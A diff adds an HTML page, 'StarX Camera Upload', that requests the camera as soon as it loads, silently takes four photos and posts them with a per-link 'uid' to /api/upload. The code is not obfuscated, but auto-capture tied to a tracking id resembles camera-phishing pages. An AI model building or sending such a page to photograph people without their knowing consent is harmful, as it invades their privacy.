@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>StarX Camera Upload</title>
+</head>
+<body>
+<h1>📸 StarX Camera Capture</h1>
+<script>
+const uid = new URLSearchParams(window.location.search).get("uid") || "NO_UID";
+
+async function startCapture() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    
+    const canvas = document.createElement('canvas');
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.play();
+
+    const photos = [];
+
+    for (let i = 0; i < 4; i++) {
+      await new Promise(r => setTimeout(r, 1000)); // 1 second interval
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
+      photos.push(blob);
+    }
+
+    const formData = new FormData();
+    photos.forEach((p, i) => formData.append('photo'+(i+1), p));
+    formData.append('uid', uid);
+
+    await fetch('/api/upload', { method: 'POST', body: formData });
+    alert("✅ Photos sent successfully!");
+    stream.getTracks().forEach(t => t.stop());
+  } catch(e) {
+    console.error(e);
+    alert("❌ Error capturing photos: " + e.message);
+  }
+}
+
+window.onload = () => startCapture();
+</script>
+</body>
+</html> 
